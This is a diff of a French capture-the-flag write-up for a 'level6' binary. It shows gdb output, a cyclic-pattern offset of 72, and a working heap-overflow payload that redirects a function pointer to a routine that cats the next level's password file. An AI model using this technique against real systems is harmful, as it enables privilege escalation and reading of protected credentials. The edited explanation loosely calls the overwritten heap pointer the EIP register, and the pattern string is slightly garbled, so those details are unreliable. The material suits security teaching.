@@ -24,20 +24,33 @@ Code assembleur de de la fonction n() appelé par main :
     80484d0:	ff d0                	call   *%eax
     ...
 
-Dans la fonction main, deux variable sont malloc.
+Dans la fonction main, deux variable sont allouees.
 On remarque qu'il ya un strcpy qui copie le contenu de notre argument dans la premiere variable allouee.
-Grace a cela on va pouvoir faire un heapoverflow pour ecraser la memoire de la deuxieme variable allouee qui est en fait un pointeur sur fonction.
-Cette fonction est appellee a la fin du main. Le but etant de mettre l'adresse de la fonction n() qui fait un /bin/cat sur le .pass de l'user level7.
+Grace a cela on va pouvoir faire un heapoverflow pour ecraser le registre EIP. Le but etant de mettre l'adresse de la fonction n() qui fait un /bin/cat sur le .pass de l'user level7.
 
 On recupere l'adresse de la fonction n() :
 
     (gdb) p n
     $1 = {<text variable, no debug info>} 0x8048454 <n>
 
-Pour calculer l'offset on se sert du site buffer overflow pattern generator. On obtient un offset de 72.
+On verifie l'offset :
+
+    gdb ./level6
+    (gdb) r Aa0Aa1Aa2a3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x63413463 in ?? ()
+
+Register value : 
+
+    0x63413463
+
+Offset :
+
+    72
 
 Procédure finale :
 
-    ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08')
+    ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
 
 On obtient le flag.
